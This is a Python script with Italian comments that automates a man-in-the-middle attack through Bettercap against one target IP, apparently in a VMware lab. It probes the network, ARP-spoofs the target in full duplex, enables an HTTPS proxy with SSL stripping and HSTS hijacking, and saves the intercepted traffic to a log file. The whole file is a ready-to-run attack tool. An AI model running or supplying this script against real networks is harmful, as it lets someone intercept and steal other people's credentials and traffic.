import subprocess
import os
import time

# --- CONFIGURAZIONE ---
INTERFACCIA = "eth0"
TARGET_IP = "192.168.142.141" 
HOST_VMWARE = "192.168.142.1"
NOME_FILE_LOG = "cattura_dati.log"

# Lista comandi ottimizzata per isolare il target e pulire i log
comandi = [
    # 1. SILENZIAMENTO E FILTRI (Ignora l'host fisico e i log fastidiosi)
    f"set net.sniff.skip {HOST_VMWARE}",
    "events.ignore zeroconf.browsing",
    "events.ignore endpoint.new",
    "events.ignore endpoint.lost",
    
    # 2. SALVATAGGIO DATI (Scrive i dati catturati su file invece che solo a schermo)
    f"set events.stream.output {NOME_FILE_LOG}",
    
    # 3. SCANNERIZZAZIONE MIRATA (Cerca il target e poi si ferma)
    "net.probe on",
    "sleep 7",
    "net.probe off", 
    
    # 4. ATTACCO ARP SPOOFING
    f"set arp.spoof.targets {TARGET_IP}",
    "set arp.spoof.fullduplex true",
    "arp.spoof on",
    
    # 5. PROXY E HIJACKING (SSL Strip)
    "set https.proxy.sslstrip true",
    "https.proxy on",
    "hstshijack"
]

def avvia_attacco():
    stringa_comandi = "; ".join(comandi)
    
    print(f"[*] Inizializzazione moduli su {INTERFACCIA}...")
    print(f"[*] Obiettivo isolato: {TARGET_IP}")
    print(f"[*] Host ignorato: {HOST_VMWARE}")
    print(f"[*] I dati catturati verranno salvati in: {NOME_FILE_LOG}")
    
    try:
        # Lancia Bettercap con i nuovi filtri
        subprocess.run([
            "sudo", "bettercap", 
            "-iface", INTERFACCIA, 
            "-eval", stringa_comandi
        ])
    except KeyboardInterrupt:
        print(f"\n\n[*] Attacco terminato. Controlla {NOME_FILE_LOG} per i risultati.")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] ERRORE: Devi eseguire lo script con 'sudo'")
    else:
        avvia_attacco()
